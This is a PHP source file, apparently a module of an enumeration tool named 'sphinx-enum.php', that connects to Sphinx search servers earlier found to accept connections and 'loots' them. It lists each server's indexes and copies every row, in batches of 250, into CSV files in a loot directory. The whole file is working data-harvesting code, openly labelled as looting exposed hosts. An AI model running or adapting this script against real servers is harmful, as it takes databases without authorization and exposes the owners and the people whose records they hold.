<?php
	if( !defined('SPHINX_ENUMERATOR' ) ) {
		die( "Please use sphinx-enum.php" );
	}

	echo "\n\n";
	echo "[!] Start the looting \n";
	echo "\n";

	/**
	 * @todo: probably we shouldnt connect to the servers again,
	 *        and should loot every server in main loop
	 *        inside sphinx-enum.php ?
	 */

	foreach( $working_hosts as $k => $host ) {
		$conn = sphinx_connect( $host );

		if( !$conn ) {
			echo "[!] couldnt connect to previously working host $host \n";
			continue ;
		}

		echo "[!] looting $host ";
		echo "($k of " . count( $working_hosts ) . ")";
		echo "\n";

		// get indexes again...
		$res = sphinx_query( $conn, "SHOW TABLES" );
		$indexes = sphinx_rows( $conn, $res );

		$target_dir = $loot_dir . mb_substr( $host, 0, mb_strpos( $host, ':' ) ) . '/';
		@ mkdir( $target_dir, 0777, true );

		foreach( $indexes as $index ) {
			$index = $index[ 'Index' ];
			echo "    looting $index \n";

			// old versions of sphinx dont support /as/ statement
			$res = sphinx_query( $conn, "SELECT min(id), max(id), count(*) FROM $index" );
			$minmax = sphinx_rows( $conn, $res )[ 0 ];

			/** @todo set a max rows count to loot for very large indexes ? */
			$rows_count = 0;
			$rows_total = $minmax[ 'count(*)' ];

			echo "      $rows_total rows total \n";
			$id_from = $minmax[ 'min(id)' ];

			// create and overwrite file
			$target_file = $target_dir . $index . '.csv';
			$fp = fopen( $target_file, 'w+' );

			while ( true ) {
				/** @todo: set batch size by script param */
				$res = sphinx_query( $conn, "SELECT * FROM $index WHERE id > $id_from ORDER BY id ASC LIMIT 250" );
				$rows = sphinx_rows( $conn, $res );

				/** @todo: show a nice overall progress with time measurement */
				echo "      row $rows_count / $rows_total \r";

				if( !count( $rows ) ) {
					echo "      index done \n";
					break ;
				}

				if( $rows_count === 0 ) {
					// write header
					fputcsv( $fp, array_keys( $rows[ 0 ] ) );
				}

				foreach( $rows as $row ) {
					$id = $row[ 'id' ];
					echo "      row $rows_count / $rows_total, id $id \r";

					fputcsv( $fp, $row );
					$id_from = $row[ 'id' ];
				}

				$rows_count += count( $rows );
			}

			fclose( $fp );
		}
	}